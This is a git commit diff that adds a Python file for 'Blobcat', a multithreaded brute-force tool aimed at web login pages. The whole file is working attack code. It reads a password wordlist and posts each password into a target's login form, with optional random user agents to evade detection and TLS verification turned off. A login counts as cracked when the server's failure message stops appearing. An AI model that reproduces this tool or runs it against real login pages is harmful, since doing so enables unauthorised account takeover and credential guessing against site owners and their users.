85650cc942cb32dc701e07d322ade00ebb8ec148
Your Name <you@example.com>
2025-05-08 15:46:40 +0700

    first commit

---
+++ Blobcat – Fast Web Login Page Bruteforce Tool/main.py
@@ -0,0 +1,187 @@
+import random
+import requests
+from datetime import datetime
+from argparse import ArgumentParser, Namespace
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import sys
+
+__version__ = 'v1.0.0' 
+__userAgent__ = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
+                    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.3',
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.',
+                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/122.0']
+
+__contentType__= [  'application/x-www-form-urlencoded',
+                    'application/json',
+                    'multipart/form-data']
+
+class Color:
+
+    BLACK   = '\033[30m'
+    RED     = '\033[31m'
+    GREEN   = '\033[32m'
+    YELLOW  = '\033[33m'
+    BLUE    = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN    = '\033[36m'
+    WHITE   = '\033[37m'
+    RESET   = '\033[39m'
+
+    def red(text):
+        print(f'[+] {Color.RED}{text}{Color.RESET}')
+
+    def green(text):
+        print(f'[+] {Color.GREEN}{text}{Color.RESET}')
+
+    def yellow(text):
+        print(f'[+] {Color.YELLOW}{text}{Color.RESET}')
+
+    def blue(text):
+        print(f'{Color.BLUE}{text}{Color.RESET}')
+
+    def magenta(text):
+        print(f'{Color.MAGENTA}{text}{Color.RESET}')
+
+    def cyan(text):
+        print(f'{Color.CYAN}{text}{Color.RESET}')
+
+    def white(text):
+        print(f'{Color.WHITE}{text}{Color.RESET}')
+
+
+def banner():
+    emoji = f'''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠈⠻⣮⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠋⠀⠀⠀⠀⠙⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣀⣠⣤⣤⣀⡀⠀⠀⣀⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⠀⠀
+⢀⣤⣾⡿⠟⠛⠛⢿⣿⣶⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣀⣀⣤⣶⣿⡿⠿⢿⣿⡀⠀
+⣿⣿⠏⠀⢰⡆⠀⠀⠉⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠁⠀⠀⢸⣿⠇⠀
+⣿⡟⠀⣀⠈⣀⡀⠒⠃⠀⠙⣿⡆⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀
+⣿⡇⠀⠛⢠⡋⢙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
+⣿⣧⠀⠀⠀⠓⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⢸⣧⣤⣤⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠀⠀
+⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⣷⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀
+⠈⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⡄⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⣶⣤⣤⣀⡀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⣄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣹
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⢸⣧
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣤⣄⣀⡀⠀⠀⠀⣿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣻⣷⣶⣾⣿⣿⡿⢯⣛⣛⡋⠁⠀⠀⠉⠙⠛⠛⠿⣿⣿⡷⣶⣿
+'''
+    text = f'''
+                                                    Fast Login Page Bruteforcer {__version__}
+                                                    Author: https://github.com/Fauzan-Aldi
+                                                    '''
+    Color.white(emoji)
+    Color.cyan(text)
+
+class FastLoginBruteforcer:
+
+    def __init__(self, args: Namespace):
+        self.url            = args.url
+        self.data           = args.data
+        self.wordlist       = args.wordlist
+        self.threads        = args.threads
+        self.random_agent   = args.random_agent
+        self.expected       = args.expected
+        self.wl             = self.load_wordlist()
+        self.wlcount        = len(self.wl)
+
+    def load_wordlist(self):
+        Color.yellow(f'Loading Wordlist ...')
+        with open(self.wordlist, 'rb') as f:
+            return f.read().splitlines()
+
+    def initial_info(self):
+        global wordlist
+        Color.yellow(f'Target URL       : {self.url}')
+        Color.yellow(f'Post Data        : {self.data}')
+        Color.yellow(f'Wordlist PATH    : {self.wordlist}')
+        Color.yellow(f'Wordlist Count   : {self.wlcount}')
+        Color.yellow(f'Threads          : {self.threads}')
+        Color.yellow(f'Random Agent     : {self.random_agent}')
+
+    def run(self):
+        self.initial_info()
+
+
+        url             = self.url
+        data            = self.data
+        expected        = self.expected
+        random_agent    = self.random_agent
+        threads         = self.threads  
+        wordlist        = self.wl
+        wlcount         = int(self.wlcount)
+
+        try:   
+            success_login = False
+
+            Color.yellow("Starting Brute Force ...")
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                processed = (executor.submit(login, url, data, pwd.decode(), expected, random_agent) for pwd in wordlist)
+                for i, process in enumerate(as_completed(processed)):
+
+                    if wlcount > 1:
+                        print("[{}][INFO] trying at {} attempt.".format(datetime.now().strftime("%H:%M:%S"), i), end="\r")
+
+                    process = process.result()
+                    if process is not False:
+                        success_login = True
+                        break
+                    
+                if success_login is True:
+                    Color.green(f"Clearing all process ...                                               ")
+                    sys.exit(0)
+                else:
+                    Color.red("cannot enter into the target dashboard")
+                    sys.exit(0)
+            
+        except Exception as error:
+            Color.cyan(error)
+            sys.exit(0)
+
+def login(url, data, password, expected, random_agent):
+    global __userAgent__
+    headers  = {"Content-Type" : "application/x-www-form-urlencoded"}
+
+    if random_agent:
+        headers['User-Agent'] = random.choice(__userAgent__)
+    else:
+        headers['User-Agent'] = __userAgent__[0]
+    data = data.replace('*', password)
+
+    try:
+        req = requests.post(url, data=data, headers=headers, verify=False)
+        req = req.text
+        if expected not in req:
+            print('Login Success with password is ', end='')
+            Color.cyan(f'{password}')
+            return True
+        return False
+    except Exception as e:
+        Color.red(f'Error: {e}')
+        return False
+        
+        
+
+if __name__ == '__main__':
+    parser = ArgumentParser(description=banner())
+    parser.add_argument('--url',          metavar='URL',       required= True, type=str, help='target url (http://example.com)')
+    parser.add_argument('--data',         metavar='DATA',      required= True, type=str, help='post data ("username=admin&password=*") you can add "*" sign to replace with wordlist value')
+    parser.add_argument('--ctype',        metavar='CTYPE',     required= False,type=int, help='content type CHOOSE -->      \n0. x-www-form-urlencoded\n1. JSON', default = 0)
+    parser.add_argument('--wordlist',     metavar='WORDLIST',  required= True, type=str, help='wordlist location path (wordlist.txt)')
+    parser.add_argument('--expected',     metavar='EXPECTED',  required= True, type=str, help='expected response when login failed ("WRONG")')
+    parser.add_argument('--threads',      metavar='THREAD',    required= False,type=int, help='number of threads (default: 1)', default = 1)
+    parser.add_argument('--random-agent', action="store_true", help='use random user agent (default: False)')
+
+
+    args    = parser.parse_args()
+    run     = FastLoginBruteforcer(args)
+
+    run.run()
